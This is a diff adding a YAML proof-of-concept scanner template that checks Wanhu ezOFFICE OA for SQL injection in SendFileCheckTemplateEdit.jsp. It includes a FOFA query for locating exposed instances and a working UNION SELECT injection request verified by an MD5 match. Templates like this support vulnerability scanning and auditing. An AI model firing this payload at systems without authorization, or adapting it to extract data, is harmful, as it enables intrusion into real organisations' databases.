@@ -1,0 +1,21 @@
+id: poc-yaml-wanhu-oa-sendfilechecktemplateedit-jsp-sqli
+info:
+  name: 万户Ezoffice SendFileCheckTemplateEdit.jsp SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_str(6)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp;?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{.t1}}%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--
+  expression: 'status_code == 200 &&
+
+    contains(body,t2)
+
+    '
+transport: http
